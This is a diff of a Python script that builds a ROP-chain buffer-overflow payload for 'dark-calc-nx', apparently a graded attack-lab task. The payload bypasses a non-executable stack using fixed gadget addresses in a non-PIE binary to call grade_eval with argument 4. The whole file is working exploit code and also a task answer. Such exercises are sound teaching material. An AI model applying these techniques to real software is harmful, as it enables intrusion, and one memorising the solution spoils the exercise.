@@ -1,40 +1,39 @@
 #!/usr/bin/env python3
-"""Task 6 payload: a ROP chain for attack/dark-calc-nx.
+"""Task 6: ROP chain for attack/dark-calc-nx (NX + ASLR, non-PIE).
 
-dark-calc-nx keeps the same vulnerable input() but has no fixed RWX mapping:
-its GNU_STACK is RW, so injected bytes on the stack cannot be fetched.  The
-overflow therefore reuses code that already exists in the binary (ret2code/ROP)
-and needs no knowledge of the randomised stack or libc addresses, because the
-main image is a non-PIE ET_EXEC linked at 0x400000.
+The stack is non-executable and its address is randomised, but the main image is
+a non-PIE ET_EXEC linked at 0x400000, so its code addresses are fixed and ASLR is
+irrelevant.  We overflow input() and return into a `pop rdi; ret` gadget (entered
+one byte into __libc_csu_init's epilogue), pass grade = 4, then grade_eval(),
+then input()'s empty-input exit path for a clean exit(0).
 
-Frame layout of input():
-
-    24 bytes        padding over expression[16] and the saved rbp
-    +0  0x401a33    pop rdi; ret   (unaligned entry into __libc_csu_init's
-                                    "pop r15; ret" epilogue: 41 5f c3)
-    +8  0x00000004  argument: grade == 4
-    +16 0x401978    grade_eval
-    +24 0x4018aa    input()+0x42: mov edi, 0; call exit@plt  -> exit(0)
-
-The stack alignment works out exactly as a normal call expects: the return
-from input() leaves rsp % 16 == 0, the gadget pops one qword, and grade_eval
-enters with rsp % 16 == 8, which is why printf() inside it does not fault.
-grade_eval is a normal function, so its own stack canary is set and verified
-normally; this payload never touches it.
+A plain `ret` between the argument and grade_eval keeps rsp % 16 == 8 at
+grade_eval entry (the same state a normal `call` produces), so its printf does
+not fault on `movaps` regardless of the glibc build.
 """
+import os
 import struct
 import sys
 
-POP_RDI = 0x401A33        # 41 5f c3: pop r15; ret entered at +1 -> pop rdi; ret
-GRADE_EVAL = 0x401978
-EXIT0_CALL_SITE = 0x4018AA
+sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
+import attacklab
 
-chain = struct.pack("<Q", POP_RDI)
-chain += struct.pack("<Q", 4)
-chain += struct.pack("<Q", GRADE_EVAL)
-chain += struct.pack("<Q", EXIT0_CALL_SITE)
+HERE = os.path.dirname(os.path.abspath(__file__))
+ELF = attacklab.Elf(os.path.join(HERE, "attack", "dark-calc-nx"))
+
+POP_RDI = attacklab.pop_rdi_ret(ELF)    # 0x401a33  (pop rdi; ret)
+RET = attacklab.ret_gadget(ELF)         # 0x401a34  (plain ret, alignment shim)
+GRADE_EVAL = ELF.symbol("grade_eval")   # 0x401978
+EXIT0 = attacklab.exit0_call_site(ELF)  # 0x4018aa  (mov edi,0; call exit@plt)
+
+chain = (
+    struct.pack("<Q", POP_RDI) +
+    struct.pack("<Q", 4) +
+    struct.pack("<Q", RET) +
+    struct.pack("<Q", GRADE_EVAL) +
+    struct.pack("<Q", EXIT0)
+)
 
 payload = b"R" * 24 + chain + b"\n"
-
 assert b"\n" not in payload[:-1]
 sys.stdout.buffer.write(payload)
